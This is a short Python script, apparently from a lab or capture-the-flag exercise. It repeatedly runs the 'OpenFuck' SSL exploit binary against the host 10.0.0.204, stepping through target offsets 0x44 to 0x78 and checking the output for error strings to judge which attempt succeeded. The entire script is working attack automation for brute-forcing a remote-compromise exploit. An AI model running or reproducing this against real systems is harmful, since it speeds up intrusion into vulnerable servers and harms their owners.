#!/bin/python3

import os

hex_head_string = "0x44"
hex_tail_string = "0x78"

def run_open_luck(expected_target):
    command_string = "./OpenFuck " + expected_target + " 10.0.0.204 -c 50 > output.txt"
    stream = os.popen(command_string)
    stream.read()

    command_string = "tail -1 output.txt"
    stream = os.popen(command_string)
    output = stream.read()

    print("output: " + output)
    if "read_ssl_packet: Record length out of range (rec_len = 0)" in output or "Error in read: Connection reset by peer" in output:
        print(expected_target + " was not successful")
    else:
        print(expected_target + " was successful")


int_from_hex = 0
escape = False
attempt = 1

while escape == False:
    int_from_hex = int(hex_head_string, 16)
    int_from_hex += 1
    hex_from_int = hex(int_from_hex)

    print("Attempt #" + str(attempt) + "; Target: " + hex_head_string)
    run_open_luck(hex_head_string)
    
    if hex_head_string == hex_tail_string:
        escape = True

    hex_head_string = hex_from_int
    attempt += 1

